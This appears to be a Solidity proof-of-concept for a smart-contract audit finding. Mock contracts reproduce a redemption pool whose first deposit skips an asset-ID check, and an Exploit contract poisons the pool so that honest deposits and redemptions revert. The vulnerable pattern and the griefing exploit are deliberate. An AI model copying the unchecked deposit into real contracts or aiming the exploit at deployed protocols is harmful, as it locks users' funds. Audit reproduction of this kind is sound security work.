// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  STBL redemption — Cyfrin, finding 66731 (Jun 2026)
    iDeposit reads MetaData.stableValueNet and, on the first deposit, sets
    NFTID = _id with no assetID == AssetID check. merge() later reverts with
    STBL_InvalidAsset, so every honest deposit fails. redeem() asks the
    configured issuer to withdraw a foreign NFT and reverts. The attacker's
    1 ether of value stays in the pool.
*/

contract ValueToken {
    string public symbol = "VAL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YLD {
    struct Meta {
        uint256 assetID;
        uint256 stableValueNet;
    }

    mapping(uint256 => Meta) public data;
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id, uint256 assetID, uint256 value) external {
        ownerOf[id] = to;
        data[id] = Meta({assetID: assetID, stableValueNet: value});
    }

    function getNFTData(uint256 id) external view returns (Meta memory) {
        return data[id];
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "owner");
        ownerOf[id] = to;
    }
}

contract Splitter {
    YLD public yld;

    constructor(YLD _yld) {
        yld = _yld;
    }

    function merge(uint256 a, uint256 b) external view returns (uint256) {
        YLD.Meta memory metaA = yld.getNFTData(a);
        YLD.Meta memory metaB = yld.getNFTData(b);
        require(metaA.assetID == metaB.assetID, "STBL_InvalidAsset");
        return a;
    }
}

contract RedemptionCore {
    YLD public yld;
    Splitter public splitter;
    ValueToken public valueToken;
    uint256 public AssetID;
    uint256 public NFTID;
    uint256 public totalSupply;
    uint256 public redeemAttempts;

    constructor(YLD _yld, Splitter _splitter, ValueToken _value, uint256 assetID) {
        yld = _yld;
        splitter = _splitter;
        valueToken = _value;
        AssetID = assetID;
    }

    function iDeposit(uint256 id) external {
        YLD.Meta memory meta = yld.getNFTData(id);
        yld.transferFrom(msg.sender, address(this), id);
        require(valueToken.transferFrom(msg.sender, address(this), meta.stableValueNet), "value");
        if (NFTID == 0) {
            // @> VULN: first deposit stores _id and never checks MetaData.assetID == AssetID
            NFTID = id;
        } else {
            NFTID = splitter.merge(NFTID, id);
        }
        totalSupply += meta.stableValueNet;
    }

    function redeem(uint256 amount) external {
        amount;
        redeemAttempts += 1;
        require(NFTID != 0, "empty");
        uint256 pooledAsset = yld.getNFTData(NFTID).assetID;
        require(pooledAsset == AssetID, "issuer");
        uint256 pay = valueToken.balanceOf(address(this));
        NFTID = 0;
        require(valueToken.transfer(msg.sender, pay), "out");
    }
}

contract Lp {
    function deposit(RedemptionCore core, ValueToken valueToken, uint256 id) external {
        YLD.Meta memory meta = core.yld().getNFTData(id);
        valueToken.approve(address(core), meta.stableValueNet);
        core.iDeposit(id);
    }
}

contract Exploit {
    uint256 public constant WRONG_ID = 2;
    uint256 public constant CORRECT_ID = 1;
    uint256 public constant ATTACK_VALUE = 1 ether;
    uint256 public constant LP_VALUE = 10000 ether;

    ValueToken public valueToken;
    YLD public yld;
    Splitter public splitter;
    RedemptionCore public core;
    Lp public lp;
    bool public lpReverted;
    bool public redeemReverted;
    uint256 public locked;

    constructor() {
        valueToken = new ValueToken();
        yld = new YLD();
        splitter = new Splitter(yld);
        core = new RedemptionCore(yld, splitter, valueToken, 1);
        lp = new Lp();
        yld.mint(address(this), WRONG_ID, 2, ATTACK_VALUE);
        yld.mint(address(lp), CORRECT_ID, 1, LP_VALUE);
        valueToken.mint(address(this), ATTACK_VALUE);
        valueToken.mint(address(lp), LP_VALUE);
        valueToken.approve(address(core), ATTACK_VALUE);
    }

    function run() external {
        core.iDeposit(WRONG_ID);
        locked = valueToken.balanceOf(address(core));
        try lp.deposit(core, valueToken, CORRECT_ID) {
            lpReverted = false;
        } catch {
            lpReverted = true;
        }
        try core.redeem(ATTACK_VALUE) {
            redeemReverted = false;
        } catch {
            redeemReverted = true;
        }
        require(core.NFTID() == WRONG_ID, "poison");
        require(yld.getNFTData(WRONG_ID).assetID != core.AssetID(), "asset");
        require(yld.ownerOf(WRONG_ID) == address(core), "held");
        require(yld.ownerOf(CORRECT_ID) == address(lp), "lp keeps");
        require(lpReverted, "lp");
        require(redeemReverted, "redeem");
        require(locked == ATTACK_VALUE, "locked");
        require(valueToken.balanceOf(address(core)) == ATTACK_VALUE, "still");
        require(valueToken.balanceOf(address(lp)) == LP_VALUE, "lp funds");
    }
}
